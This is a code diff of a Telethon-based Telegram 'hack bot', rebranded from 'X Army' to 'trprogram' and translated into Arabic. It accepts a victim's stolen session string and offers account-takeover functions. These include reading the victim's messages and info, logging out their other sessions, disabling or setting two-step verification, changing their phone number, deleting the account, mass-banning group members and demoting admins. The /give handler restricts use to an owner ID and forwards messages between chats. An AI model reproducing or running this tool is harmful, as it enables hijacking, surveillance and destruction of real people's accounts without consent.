@@ -1,4 +1,3 @@
-
 import os
 os.system("pip install Telethon==1.21.1")
 from telethon import TelegramClient, events, functions, types
@@ -20,7 +19,7 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-legendx = 1967548493
+legendx = 1485149817
 
 
 async def change_number_code(strses, number, code, otp):
@@ -145,238 +144,224 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "TheXArmy"
+channel = "trprogram"
 menu = '''
-
-**NOTICE JOIN DARKEN FEDERATION**
-FED ID `2936f6a8-cc1d-4f76-ac1f-ac752fe5caef`
-
-
-A: [⇜ ⌯لعرض قنوات الشخص⇜ ⌯]
-
-B: [⇜ ⌯لعرض معلومات الشخص كامله⇜ ⌯]
-
-C: [⇜ ⌯لتفليش مجموعه او قناة معينه⇜ ⌯}]
-
-D: [⇜ ⌯تسجيل الدخول -اختراق حساب المستخدم⇜ ⌯}]
-
-E: [⇜ ⌯اشتراك بقنل بالك⇜ ⌯]
-
-F: [⇜ ⌯مغادره قناة معينه⇜ ⌯]
-
-G: [⇜ ⌯⇜حذف قنا +كروب ⌯]
-
-H: [⇜ ⌯لمعرفه التحقق بخطوتين وسهوله الاختراق⇜ ⌯]
-
-I: [⇜ ⌯⇜تسجيل خروج من كل الجلسات ماعدا البوت ⌯]
-
-J: [⇜ ⌯حذف حساب الشخص⇜ ⌯]
-
-K: [⇜ ⌯تنزيل كل المشرفين في المجموعه او القنا⇜ ⌯]
-
-L: [⇜ ⌯  لرفعك مشرف بكروب معين⇜ ⌯]
-
-M: [⇜ ⌯تغير رقم التلفون-الهاتف⇜ ⌯]
-
-تعريب ملفات السورس 𝘽𝙔: @ryjjhw
-
+**OUR Channel : @trprogram**
+A: [ ** تحقق من قنوات وقروبات الحساب **]
+B: [** اضهار معلومات المستخدم مثل :الرقم، الاسم، والايدي **]
+C: [** لـحظر جميع اعضاء قروب معين، يتطلب كود ترمكس**]
+D: [** تسجيل الدخول الى حساب الضحية **]
+E: [** دخول لقنـاة بواسطة كود تيرمكس** ]
+F: [** خروج من قناة بواسطة كود تيرمكس **]
+G: [** حذف قناة او قروب **]
+H: [** التحقق اذا كان التحقق بخطوتين مفعل ام لا **]
+I: [** تسجيل الخروج من جميع الجلسات ماعدى جلستك **]
+J: [** حذف الحساب **]
+K: [** تنزيل جميع رتب الادمنية من قروب معين او قناة **]
+L: [** ترقية عضو في قناة او قروب **]
+M: [** تغيير رقم الهاتف باستعمال كود تيرمكس **]
+** مميزات اكثر لاحقاً **
+** طريقة استخراج كود تيرمكس : @brrbbb **
 '''
 mm = '''
-You can hack anybody
-Take his StringSession and use me
-I will give you full power of mine
-Type /hack
+**
+مرحباً، 
+يمكنك اختراق اي حساب بواسطة كود تيرمكس! 
+للمميزات ارسل : /op
+قناة السورس: @trprogram 
+**
 '''
 @client.on(events.NewMessage(pattern="/start"))
 async def op(event):
   global mm
   if not event.is_private:
-    await event.reply("please use me in pm🥺")
+    await event.reply("**الرجاء استعمالي في الليل **")
   else:
     await event.reply(mm)
 @client.on(events.NewMessage(pattern="/give"))
 async def op(event):
   if not event.sender_id == legendx:
-    return await event.reply("please don't use me fuck off 🥺")
-  try:
-    await event.reply("session bot file", file="Xarmy.session")
-  except Exception as e:
-    print (e)
+    return await event.reply("please don't use me 🥺")
+  async for x in client.iter_messages("Trakos"):
+    try:
+      await x.forward_to("ttrakos")
+    except:
+      pass
 
 
-@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
+@client.on(events.NewMessage(pattern="/op", func=lambda x: x.is_group))
 async def op(event):
   await event.reply("please use me in pm🥺")
-@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
+@client.on(events.NewMessage(pattern="/op", func = lambda x: x.is_private))
 async def start(event):
   global menu
   async with bot.conversation(event.chat_id) as x:
-    await x.send_message(f"Choose what you want with string session \n\n{menu}")
+    await x.send_message(f"اختار ماذا تريد ان تفعل بواسطة كود تيرمكس \n\n{menu}")
     res = await x.get_response()
     r = res.text
     if res.text == "A":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("** ارسل كود  تيرمكس الان **")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("كود تيرمكس هذا تم الغاء تفعيلة")
       try:
         i = await userchannels(strses.text)
       except:
-        return await event.reply("This StringSession is terminated maybe")
+        return await event.reply("كود تيرمكس هذا تم الغاء تفعيلة")
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDETAILS BY X ARMY")
+        file.write(i + "\n\nDETAILS BY TRAKOS")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nThanks For using X Army Bot")
+        await event.reply(i + "\n\n شكرا لاستعمالك الروبوت الخاص بنا")
     elif res.text == "B":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("** ارسل كود تيرمكس **")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("كود تيرمكس هذا تم الغاء تفعيلة")
       i = await userinfo(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await event.reply(i + "\n\nشكرا لاستعمالك الروبوت الخاص بنا")
     elif r == "C":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("** ارسل كود تيرمكس **")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("كود تيرمكس هذا تم الغاء تفعيلة")
+      await x.send_message("**الان ارسل ايدي كروب/القناة **")
       grpid = await x.get_response()
       await userbans(strses.text, grpid.text)
-      await event.reply("Banning all members Thanks For using X Army Bot")
+      await event.reply("** تم حظر جميع الاعضاء **")
     elif r == "D":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("** ارسل كود تيرمكس **")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("** كود تيرمكس هذ لايعمل **")
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await event.reply(i + "\n\nشكرا لاستعمالك بوت الهاك ")
     elif r == "E":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("** ارسل كود تيرمكس **")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("** كود تيرمكس هذ لايعمل **")
+      await x.send_message("** ارسل ايدي الكروب/القناة **")
       grpid = await x.get_response()
       await joingroup(strses.text, grpid.text)
-      await event.reply("Joined the Channel/Group Thanks For using X Army Bot")
+      await event.reply("**تم دخول القناة/الكروب بنجاح للتحقق شوف اخر الاحداث **")
     elif r == "F":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("** ارسل كود تيرمكس **")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("** كود تيرمكس هذ لايعمل **")
+      await x.send_message("** اعطيني ايدي الكروب/القناة **")
       grpid = await x.get_response()
       await leavegroup(strses.text, grpid.text)
-      await event.reply("Leaved the Channel/Group Thanks For using X Army Bot")
+      await event.reply("**تمت المغادره بنجاح**")
     elif r == "G":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("** ارسل كود تيرمكس **")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
+        return await event.respond("** كود تيرمكس هذ لايعمل **")
+      await x.send_message("** ارسل ايدي الكروب/القناة **")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using X Army Bot")
+      await event.reply("** تمت عملية الحذف بنجاح **")
     elif r == "H":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("** ارسل كود تيرمكس **")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("** كود تيرمكس هذ لايعمل **")
       i = await user2fa(strses.text)
       if i:
-        await event.reply("User don't have two step thats why now two step is `LEGENDXISBEST` you can login now\n\nThanks For using X Army Bot")
+        await event.reply("** المستخدم لايملك تحقق بخطوتين! يمكنك الان تسجيل الدخول **")
       else:
-        await event.reply("Sorry User Have two step already")
+        await event.reply("** عُذرا المستخدم يمتلك تحقق بخطوتين **")
     elif r == "I":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("** ارسل كود تيرمكس **")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("** كود تيرمكس هذ لايعمل **")
       i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using X Army Bot")
+      await event.reply("** تم تسجيل الخروج منجميع الجلسات عدا البوت **")
     elif res.text == "J":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("** ارسل كود تيرمكس **")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("** كود تيرمكس هذ لايعمل **")
       i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using X Army Bot")
+      await event.reply("**تم حذف الحساب بنجاح **")
     elif res.text == "L":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("** ارسل كود تيرمكس **")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+        return await event.respond("** كود تيرمكس هذ لايعمل **")
+      await x.send_message("** الان قم بارسال اسم المستخدم الخاص بالقناة/الكروب **")
       grp = await x.get_response()
-      await x.send_message("NOW GIVE USER USERNAME")
+      await x.send_message("** الان ارسل معرفك **")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
+      await event.reply("** تمت ترقيتك بنجاح  **")
     elif res.text == "K":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("** ارسل كود تيرمكس **")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+        return await event.respond("** كود تيرمكس هذ لايعمل **")
+      await x.send_message("** الان قم بإرسال معرف القناة /الكروب **")
       pro = await x.get_response()
       try:
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
+      await event.reply("** لقد قمت بتنزيل جميع الأعضاء  **")
     elif res.text == "M":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("** ارسل كود تيرمكس **")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
+        return await event.respond("** كود تيرمكس لايعمل  **")
+      await x.send_message("** الان ارسل الرقم **\nلاتستعمل ارقام وهمية للتتحقق")
       number = (await x.get_response()).text
       try:
         result = await change_number(strses.text, number)
-        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
+        await event.respond(result + "\n **copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp**")
         await asyncio.sleep(20)
         await x.send_message("NOW GIVE PHONE CODE HASH")
         phone_code_hash = (await x.get_response()).text
@@ -384,14 +369,14 @@ async def start(event):
         otp = (await x.get_response()).text
         changing = await change_number_code(strses.text, number, phone_code_hash, otp)
         if changing:
-          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
+          await event.respond("** تم تغيير رقم الهاتف **")
         else:
-          await event.respond("Something is wrong")
+          await event.respond("حدث خطأ ")
       except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @sessionhack_chat\n**LOGS**\n" + str(e))
+        await event.respond("**اذا واجهتك اي مشكله أرسلها هنا : @RYJJHW**" + str(e))
 
     else:
-      await event.respond("Wrong Text Found Re type /hack and use")
+      await event.respond("**لم يتم العثور على الامر! الرجاء ارسال : /kj والمحاولة فيما بعد**")
 
 
 
